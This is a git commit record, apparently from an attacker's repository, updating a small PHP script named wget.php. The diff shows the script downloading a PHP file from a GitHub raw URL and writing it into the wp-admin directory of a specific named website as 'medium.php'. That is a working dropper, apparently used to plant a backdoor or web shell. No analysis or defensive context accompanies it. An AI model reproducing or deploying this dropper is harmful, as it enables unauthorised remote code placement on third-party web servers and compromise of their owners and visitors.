e947d88e9faeac31c58e1e0d606020c786eaaa10
prokontra <99330473+prokontra@users.noreply.github.com>
2022-02-14 14:24:23 +0700

    Update wget.php

--- wget.php
+++ wget.php
@@ -1,4 +1,4 @@
- <?php $nama= fopen("dor.php" ,"w+");
+ <?php $nama= fopen("/home/cgwetyvz/physicallyfitct.com/wp-admin/medium.php" ,"w+");
   $file = file_get_contents('https://raw.githubusercontent.com/prokontra/byps/main/tesla.php');
   $tulis = fwrite ($nama ,$file);
  fclose($nama); ?>
